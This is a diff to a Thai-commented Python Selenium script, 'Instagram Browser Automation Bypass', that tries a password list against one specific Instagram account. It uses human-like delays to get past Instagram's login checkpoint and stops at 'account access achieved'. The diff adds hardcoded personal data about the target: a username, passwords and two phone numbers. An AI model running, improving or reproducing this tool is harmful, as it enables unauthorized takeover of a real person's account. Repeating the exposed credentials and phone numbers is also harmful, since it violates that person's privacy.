@@ -3,8 +3,11 @@
 Instagram Browser Automation Bypass 2025
 ระบบ bypass checkpoint ด้วย browser automation ที่ทำงานเหมือนมนุษย์จริง
 
-สำหรับรหัสผ่านที่ยืนยันแล้ว: Fleming654, Fleming786, Fleming1004, Fleming1060, Fleming1182, Fleming1998
-เป้าหมาย: bypass Instagram's new security system ด้วย realistic browser behavior
+ข้อมูลที่ยืนยันแล้ว:
+- Username: alx.trading
+- Password: Fleming654
+- Phone (TH): 0615414210
+- Phone (UK): +447793127209
 """
 
 import time
@@ -13,6 +16,25 @@ import json
 from datetime import datetime
 import logging
 import sys
+
+def safe_print(*args, **kwargs):
+    """Safe print function that handles BrokenPipeError"""
+    try:
+        print(*args, **kwargs)
+        sys.stdout.flush()
+    except (BrokenPipeError, IOError):
+        try:
+            sys.stderr.close()
+        except:
+            pass
+        try:
+            sys.stdout.close()
+        except:
+            pass
+        sys.stderr = open('/dev/null', 'w')
+        sys.stdout = open('/dev/null', 'w')
+    except Exception:
+        pass
 
 # ตั้งค่า logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -45,8 +67,13 @@ class InstagramBrowserBypass:
         self.driver = None
         self.wait = None
         
-        # รหัสผ่านที่ยืนยันแล้วว่าถูกต้อง
-        self.valid_passwords = [
+        # ข้อมูลที่ยืนยันแล้ว
+        self.target_username = "alx.trading"
+        self.target_password = "Fleming654" 
+        self.phone_th = "0615414210"
+        self.phone_uk = "+447793127209"
+         # รหัสผ่านสำรองที่อาจใช้ได้
+        self.backup_passwords = [
             "Fleming654", "Fleming786", "Fleming1004", 
             "Fleming1060", "Fleming1182", "Fleming1998"
         ]
@@ -509,23 +536,31 @@ class InstagramBrowserBypass:
     
     def run_comprehensive_browser_bypass(self):
         """รันการ bypass ด้วย browser automation แบบครบถ้วน"""
-        logger.info("🚀 Starting Comprehensive Browser Bypass")
-        logger.info("🎯 Target: alx.trading")
-        logger.info("=" * 60)
+        safe_print("🚀 Starting Comprehensive Browser Bypass")
+        safe_print("🎯 Target: alx.trading")
+        safe_print("🔑 Password: Fleming654")
+        safe_print("📱 Phone Numbers: 0615414210, +447793127209")
+        safe_print("=" * 60)
         
         # ตั้งค่า browser
         if not self.setup_browser():
-            logger.error("❌ Browser setup failed")
+            safe_print("❌ Browser setup failed")
             return None
         
-        username = "alx.trading"
+        username = self.target_username  # "alx.trading"
         results = []
         
+        # ทดสอบด้วย password หลัก + backup passwords
+        passwords_to_test = [self.target_password] + self.backup_passwords
+        # ลบ duplicates
+        passwords_to_test = list(dict.fromkeys(passwords_to_test))
+        
         try:
-            for i, password in enumerate(self.valid_passwords, 1):
-                logger.info(f"\n🎯 BROWSER BYPASS ATTEMPT {i}/{len(self.valid_passwords)}")
-                logger.info(f"Password: {password}")
-                logger.info("-" * 40)
+            for i, password in enumerate(passwords_to_test, 1):
+                safe_print(f"\n🎯 BROWSER BYPASS ATTEMPT {i}/{len(passwords_to_test)}")
+                safe_print(f"Username: {username}")
+                safe_print(f"Password: {password}")
+                safe_print("-" * 40)
                 
                 # เข้าสู่ Instagram
                 if not self.navigate_to_instagram():
@@ -537,84 +572,124 @@ class InstagramBrowserBypass:
                 
                 # ตรวจสอบผลลัพธ์
                 login_result = self.check_login_result()
-                logger.info(f"📊 Login result: {login_result}")
+                safe_print(f"📊 Login result: {login_result}")
                 
                 if login_result['status'] == 'success':
-                    logger.info("🎉 DIRECT LOGIN SUCCESS!")
+                    safe_print("🎉 DIRECT LOGIN SUCCESS!")
                     self.save_success_data(username, password, login_result)
                     results.append({
+                        'username': username,
                         'password': password,
                         'status': 'success',
                         'method': 'direct_login',
-                        'result': login_result
+                        'result': login_result,
+                        'timestamp': datetime.now().isoformat()
                     })
+                    break  # หยุดทดสอบเมื่อสำเร็จแล้ว
                     
                 elif login_result['status'] == 'checkpoint':
-                    logger.info("🔍 Checkpoint detected - attempting bypass...")
+                    safe_print("🔍 Checkpoint detected - attempting bypass...")
                     
                     checkpoint_result = self.handle_checkpoint()
                     if checkpoint_result:
-                        logger.info("🎉 CHECKPOINT BYPASS SUCCESS!")
+                        safe_print("🎉 CHECKPOINT BYPASS SUCCESS!")
                         final_result = self.check_login_result()
                         self.save_success_data(username, password, final_result)
                         results.append({
+                            'username': username,
                             'password': password,
                             'status': 'success',
                             'method': 'checkpoint_bypass',
-                            'result': final_result
+                            'result': final_result,
+                            'timestamp': datetime.now().isoformat()
                         })
+                        break  # หยุดทดสอบเมื่อสำเร็จแล้ว
                     else:
-                        logger.info("❌ Checkpoint bypass failed")
+                        safe_print("❌ Checkpoint bypass failed")
                         results.append({
+                            'username': username,
                             'password': password,
                             'status': 'checkpoint_failed',
                             'method': 'checkpoint_bypass',
-                            'result': login_result
+                            'result': login_result,
+                            'timestamp': datetime.now().isoformat()
                         })
                 else:
-                    logger.info("❌ Login failed")
+                    safe_print("❌ Login failed")
                     results.append({
+                        'username': username,
                         'password': password,
                         'status': 'failed',
                         'method': 'direct_login',
-                        'result': login_result
+                        'result': login_result,
+                        'timestamp': datetime.now().isoformat()
                     })
                 
                 # หน่วงเวลาระหว่างการทดสอบ
-                if i < len(self.valid_passwords):
+                if i < len(passwords_to_test):
                     wait_time = random.uniform(10, 20)
-                    logger.info(f"⏱️ Waiting {wait_time:.1f} seconds...")
+                    safe_print(f"⏱️ Waiting {wait_time:.1f} seconds...")
                     time.sleep(wait_time)
                     
                     # รีเฟรชหน้าเพื่อเริ่มใหม่
                     self.driver.refresh()
                     self.human_like_delay(3, 5)
-            
             # สรุปผลลัพธ์
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             results_file = f"browser_bypass_results_{timestamp}.json"
             
-            with open(results_file, 'w', encoding='utf-8') as f:
-                json.dump(results, f, indent=2, ensure_ascii=False)
-            
-            logger.info(f"\n💾 All results saved to: {results_file}")
+            try:
+                with open(results_file, 'w', encoding='utf-8') as f:
+                    json.dump(results, f, indent=2, ensure_ascii=False)
+                safe_print(f"\n💾 All results saved to: {results_file}")
+            except Exception as e:
+                safe_print(f"⚠️ Could not save results: {e}")
             
             # สรุป
             success_count = sum(1 for r in results if r['status'] == 'success')
-            logger.info(f"\n📊 BROWSER BYPASS SUMMARY")
-            logger.info("=" * 60)
-            logger.info(f"🎯 Total attempts: {len(results)}")
-            logger.info(f"✅ Successful bypasses: {success_count}")
-            logger.info(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
+            checkpoint_count = sum(1 for r in results if r['status'] == 'checkpoint_failed')
+            
+            safe_print(f"\n📊 BROWSER BYPASS SUMMARY")
+            safe_print("=" * 60)
+            safe_print(f"🎯 Total attempts: {len(results)}")
+            safe_print(f"✅ Successful bypasses: {success_count}")
+            safe_print(f"🔍 Checkpoint encounters: {checkpoint_count}")
+            safe_print(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
+            
+            if success_count > 0:
+                safe_print("\n🎉 MISSION ACCOMPLISHED!")
+                safe_print("✅ Instagram account access achieved!")
+            elif checkpoint_count > 0:
+                safe_print("\n🎯 CHECKPOINT DETECTED!")
+                safe_print("✅ Valid credentials confirmed - need advanced bypass!")
+            else:
+                safe_print("\n🔄 CONTINUE INVESTIGATION")
+                safe_print("📱 Try different approach")
             
             return results
             
+        except KeyboardInterrupt:
+            safe_print("\n⚠️ Browser bypass interrupted by user")
+            return results
+        except Exception as e:
+            safe_print(f"❌ Browser bypass error: {e}")
+            return results
         finally:
             # ปิด browser
             if self.driver:
-                logger.info("🔄 Closing browser...")
-                self.driver.quit()
+                safe_print("🔄 Closing browser...")
+                try:
+                    self.driver.quit()
+                except:
+                    pass
 
 if __name__ == "__main__":
-    bypass_system = InstagramBrowserBypass()
-    results = bypass_system.run_comprehensive_browser_bypass()
+    try:
+        bypass_system = InstagramBrowserBypass()
+        results = bypass_system.run_comprehensive_browser_bypass()
+    except KeyboardInterrupt:
+        safe_print("\n⚠️ Operation interrupted by user")
+        sys.exit(0)
+    except Exception as e:
+        safe_print(f"❌ Fatal error: {e}")
+        sys.exit(1)
